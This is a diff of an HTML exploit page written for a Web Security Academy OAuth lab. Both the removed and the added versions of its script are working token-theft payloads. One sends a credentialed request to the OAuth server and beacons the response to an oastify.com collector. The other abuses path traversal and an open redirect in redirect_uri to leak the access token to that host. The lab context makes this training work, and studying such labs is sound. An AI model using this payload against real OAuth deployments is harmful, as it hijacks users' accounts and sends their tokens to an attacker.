@@ -4,21 +4,12 @@
     <title>Capture</title>
 </head>
 <body>
-    <script type="text/javascript">
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://oauth-0a4c002e0421be02855f979c02e200ed.oauth-server.net/auth?client_id=u0gk1nyhh95auhq09j6s0&redirect_uri=https://0ac300d004b5be84853d995b00830046.web-security-academy.net/oauth-callback/../post/next?path=https://ap3ir4k7gevo0550p9tplwji49a0ysmh.oastify.com&response_type=token&nonce=868486773&scope=openid%20profile%20email
-
-
-', true);
-        xhr.withCredentials = true;
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                var data = xhr.responseText;
-                var img = new Image();
-                img.src = 'https://ap3ir4k7gevo0550p9tplwji49a0ysmh.oastify.com/log?data=' + encodeURIComponent(data);
-            }
-        };
-        xhr.send();
-    </script>
+    <script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a4c002e0421be02855f979c02e200ed.oauth-server.net/auth?client_id=u0gk1nyhh95auhq09j6s0&redirect_uri=https://0ac300d004b5be84853d995b00830046.web-security-academy.net/oauth-callback/../post/next?path=https://ap3ir4k7gevo0550p9tplwji49a0ysmh.oastify.com&response_type=token&nonce=868486773&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
 </body>
 </html>
